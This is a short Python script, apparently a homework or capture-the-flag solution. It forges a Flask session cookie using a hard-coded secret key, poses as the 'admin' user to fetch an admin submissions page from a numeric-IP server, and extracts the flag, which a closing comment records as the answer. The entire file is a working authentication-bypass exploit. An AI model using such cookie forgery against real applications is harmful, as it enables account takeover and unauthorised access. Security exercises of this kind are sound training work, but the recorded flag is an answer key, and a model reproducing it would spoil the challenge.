import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.config['SECRET_KEY'] = 'A_super_SecUrE_$eCR37_keY'


s = SecureCookieSessionInterface().get_signing_serializer(app)
forged_cookie = s.dumps({'username': 'admin'})

base_url = "http://140.112.187.51:45588"


cookies = {
    'session': forged_cookie
}
r = requests.get(f"{base_url}/submissions/admin", cookies=cookies).text
start = r.find('HW12{')
end = r[start:].find('}')
flag = r[start:start+end+1]
print(flag)

# HW12{i_l1KE_a15CR3am_MoRE_7H4n_Co0Ki3s}
